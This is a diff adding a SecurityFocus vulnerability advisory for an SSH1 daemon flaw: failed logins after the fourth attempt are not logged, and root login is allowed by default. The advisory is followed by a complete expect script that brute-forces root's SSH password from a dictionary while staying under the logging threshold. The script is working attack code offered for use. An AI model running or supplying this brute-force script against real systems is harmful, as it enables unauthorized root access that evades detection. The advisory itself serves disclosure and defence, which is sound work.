@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/2345/info
+
+SSH1 is the implementation of the Secure Shell communication protocol by SSH Communications. SSH1 is version 1 of the protocol specified by IETF draft to protect the integrity of traffic over the network.
+
+A problem with the implementation of the SSH1 daemon could allow an attacker to by-pass numerous attempts at brute force cracking a system. The logging routine in the SSH1 code does not capture failed attempts beyond the fourth attempt. In a brute force attack scenario, there are numerous successive attempts at logging in as a specific user. This danger is escalated by the SSH1 package allowing remote root logins by default.
+
+It is possible for a remote user with malicious intent to launch a brute force attack against a system and successfully remain unnoticed by system logging utilities beyond the fourth attempted login. By use of this method, it is possible for the remote user to gain access to any account, and potentially the root account. 
+
+#!/usr/bin/expect -f
+#
+# simple expect exploit to brute force root's password via ssh without
+# detection.. see CLABS200101 for info on this exploit.
+#
+# this is beerware, just buy me a beer at defcon if you like this.
+# build your own dictionary, use at your own risk, no warranty, etc.
+#
+# jose@crimelabs.net		january, 2001
+#
+set timeout 3
+set target [lindex $argv 0]
+set dictionary [lindex $argv 1]
+
+if {[llength $argv] !=  2} {
+   puts stderr "Usage: $argv0 root@target dictionary\n"
+   exit }
+
+set tryPass [open $dictionary r]
+
+foreach passwd [split [read $tryPass] "\n"] {
+  spawn ssh $target
+  expect ":"
+  send "$passwd\n"
+  expect "#" { puts "password is $passwd\n" ; exit }
+  set id [exp_pid]
+  exec kill -INT $id
+}
